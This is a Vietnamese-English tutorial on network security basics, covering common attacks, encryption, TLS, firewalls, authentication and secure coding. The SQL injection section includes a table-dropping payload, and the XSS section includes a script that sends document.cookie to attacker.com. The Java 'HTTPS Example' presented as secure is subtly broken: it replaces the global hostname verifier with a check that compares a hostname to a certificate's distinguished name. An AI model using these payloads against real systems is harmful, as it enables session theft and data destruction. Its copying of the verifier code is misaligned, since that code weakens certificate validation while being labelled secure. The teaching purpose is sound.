# Network Security Basics — Bảo vệ Mạng của Bạn


## Network Security Overview

Network security là việc bảo vệ mạng từ các truy cập trái phép, thay đổi dữ liệu, hoặc xóa dữ liệu.

### Mục tiêu Security (CIA Triad)

```
      ┌──────────┐
      │ Integrity│  ← Dữ liệu không được sửa đổi
      └──────────┘
          ▲
         / \
        /   \
┌──────────┐ ┌──────────────┐
│Confidence│ │Availability  │
│(Privacy) │ │(No Downtime) │
└──────────┘ └──────────────┘
```

1. **Confidentiality (Bảo mật)**: Chỉ người được phép mới xem dữ liệu
2. **Integrity (Toàn vẹn)**: Dữ liệu không bị thay đổi trái phép
3. **Availability (Khả dụng)**: Dữ liệu luôn sẵn sàng khi cần

## Common Network Attacks

### 1. Denial of Service (DoS)

Làm quá tải server:

```
Attacker
  |
  | Flood packets to port 80
  v
Server → Overwhelmed → Can't serve users
```

**Ví dụ:**
```
Attacker gửi 1,000,000 requests/second
Server chỉ có thể xử lý 10,000 requests/second
→ Legitimate users không thể truy cập
```

**Bảo vệ:**
- Rate limiting
- Traffic filtering
- CDN (CloudFlare, Akamai)

### 2. Distributed Denial of Service (DDoS)

Tấn công từ nhiều machines:

```
┌─────────────────────────────────────────────┐
│         Attacker's Command Server           │
└──────────┬──────────────────────────────────┘
           │ Commands
    ┌──────┼──────┬──────┐
    │      │      │      │
    v      v      v      v
┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐
│Bot 1│ │Bot 2│ │Bot 3│ │Bot N│  (Compromised devices)
└──┬──┘ └──┬──┘ └──┬──┘ └──┬──┘
   │       │       │       │
   └───────┼───────┼───────┘
           │       │ All flood
           │       │ victim
           v       v
        ┌──────────────────┐
        │ Victim Server    │
        │ (Overwhelmed)    │
        └──────────────────┘
```

### 3. Man-in-the-Middle (MITM) Attack

```
User A ←→ Attacker ←→ User B (Attacker gửi/nhận)
         (Listens and modifies)
```

**Ví dụ - Unencrypted Wifi:**
```
Client: Send password: 12345 (plain text)
Attacker on same WiFi: Captures password!
```

**Bảo vệ:** HTTPS/TLS encryption

### 4. SQL Injection

```
Normal query:
SELECT * FROM users WHERE username = 'john'

Malicious input:
username = ' OR '1'='1'--
Query becomes:
SELECT * FROM users WHERE username = '' OR '1'='1'--
Result: Returns ALL users!

Worse - Delete all data:
username = ' ; DROP TABLE users;--
```

**Bảo vệ:**
- Parameterized queries
- Input validation
- ORM (Object-Relational Mapping)

### 5. Cross-Site Scripting (XSS)

```
Attacker injects JavaScript:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

When victim views page:
→ Attacker gets victim's cookies
→ Can hijack session
```

**Ví dụ:**
```
User comment: <img src=x onerror="alert('XSS')">
When others view comment → Alert appears
```

**Bảo vệ:**
- HTML sanitization
- Content Security Policy (CSP)
- HttpOnly cookies

## Encryption

### Symmetric Encryption

```
Original Data: "Secret Message"
    ↓
Encrypt with Key: "password123"
    ↓
Encrypted: "K7#@!$Q%^&"
    ↓
Decrypt with same Key: "password123"
    ↓
Original Data: "Secret Message"
```

**Fast nhưng có vấn đề:** Làm sao chia sẻ key an toàn?

**Algorithms:** AES, DES, Blowfish

### Asymmetric Encryption

```
Người A có: Public Key (công khai), Private Key (bí mật)

Người B muốn gửi Secret cho Người A:
Secret
  ↓
Encrypt with Public Key của A
  ↓
Encrypted Secret (bất kỳ ai cũng có thể gửi)
  ↓
Người A Decrypt với Private Key (chỉ A biết)
  ↓
Secret (an toàn!)
```

**Ưu điểm:** Không cần chia sẻ key  
**Nhược điểm:** Slow hơn symmetric

**Algorithms:** RSA, ECC

## TLS/SSL Encryption

HTTPS sử dụng TLS (Transport Layer Security):

```
1. Client → Server: Hello (supported algorithms)

2. Server → Client: Certificate + Public Key

3. Client: 
   - Verify certificate
   - Generate random key
   - Encrypt with Server's public key
   → Send to server

4. Server:
   - Decrypt with private key
   - Now both have shared key

5. All data now encrypted with shared key
```

## Firewall

```
┌─────────────────────────────────────────────┐
│            Internet                         │
└─────────┬───────────────────────────────────┘
          │
          │ Firewall Rules:
          │ - Allow: HTTP(80), HTTPS(443), SSH(22)
          │ - Block: Everything else
          ↓
┌─────────────────────────────────────────────┐
│            Internal Network                 │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│  │Web Server│  │App Server│  │Database  │  │
│  │Port 80   │  │Port 8080 │  │Port 3306 │  │
│  └──────────┘  └──────────┘  └──────────┘  │
└─────────────────────────────────────────────┘
```

## Authentication

### Single-Factor (Weak)

```
Login
  ↓
Enter password
  ↓
If correct → Access
```

**Problem:** Password bị crack

### Multi-Factor Authentication (MFA)

```
Login
  ↓
Enter password
  ↓
If correct → 
  ↓
Receive code on phone
  ↓
Enter code
  ↓
If correct → Access
```

**Factors:**
1. Something you know (password)
2. Something you have (phone, hardware token)
3. Something you are (fingerprint, face)

## Secure Coding

### Bad ❌

```java
String query = "SELECT * FROM users WHERE id = " + userId;
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);
// Vulnerable to SQL injection!
```

### Good ✅

```java
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();
// Protected - parameters are escaped
```

### HTTPS Example

```java
import javax.net.ssl.HttpsURLConnection;
import java.net.URL;

public class SecureConnection {
    public static void main(String[] args) throws Exception {
        URL url = new URL("https://api.example.com/data");
        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
        
        // Verify certificate
        conn.setDefaultHostnameVerifier((hostname, session) -> {
            // Check if certificate is valid for this hostname
            return hostname.equals(session.getPeerPrincipal().getName());
        });
        
        int statusCode = conn.getResponseCode();
        System.out.println("Status: " + statusCode);
    }
}
```

### Secure Headers

```
HTTP Response Headers:
├─ Strict-Transport-Security: max-age=31536000
│  (Force HTTPS)
├─ Content-Security-Policy: default-src 'self'
│  (Only load resources from same origin)
├─ X-Content-Type-Options: nosniff
│  (Prevent MIME sniffing)
├─ X-Frame-Options: DENY
│  (Prevent clickjacking)
└─ X-XSS-Protection: 1; mode=block
   (Enable XSS filter in browser)
```

## Password Security

### Bad ❌

```
Store: password = "mypassword123"
```

**Problem:** If DB breached, all passwords exposed

### Good ✅

```java
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
String hashed = encoder.encode("mypassword123");
// Stored: $2a$10$dXJ3SW6G7P50eS3QNutsnO...

// Verify
encoder.matches("mypassword123", hashed); // true
```

**Hash vs Encryption:**
- Hash: One-way (cannot recover original)
- Encryption: Two-way (can decrypt)

## Network Monitoring

```bash
# Monitor connections
netstat -an

# Detailed packet analysis
tcpdump -i eth0 -n host 192.168.1.100

# Check for suspicious activity
sudo tail -f /var/log/auth.log | grep Failed

# Intrusion detection
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
```

## Security Layers

```
                    ┌─────────────┐
                    │ Application │ (XSS, SQL Injection, CSRF)
                    └─────────────┘
                          ↓
                    ┌─────────────┐
                    │   Network   │ (Firewall, IDS)
                    └─────────────┘
                          ↓
                    ┌─────────────┐
                    │   Encryption│ (TLS/SSL)
                    └─────────────┘
                          ↓
                    ┌─────────────┐
                    │ Authentication
                    │  & Auth     │ (MFA, Passwords)
                    └─────────────┘
```

## Best Practices

1. **Always use HTTPS**: Encrypt all data in transit
2. **Hash passwords**: Never store plain passwords
3. **Validate input**: Check user data
4. **Use firewalls**: Restrict access
5. **Keep updated**: Apply security patches
6. **Disable defaults**: Change default passwords
7. **Monitor logs**: Detect suspicious activity
8. **Principle of least privilege**: Give minimum needed access
9. **Backup data**: Recover from incidents
10. **Educate users**: Most breaches are human error

## Kết luận

Network security là ongoing process:

✅ Understand threats  
✅ Implement defenses  
✅ Monitor continuously  
✅ Update regularly  

Bảo mật không bao giờ hoàn hảo 100%, nhưng việc làm khó hơn cho attackers luôn có giá trị!

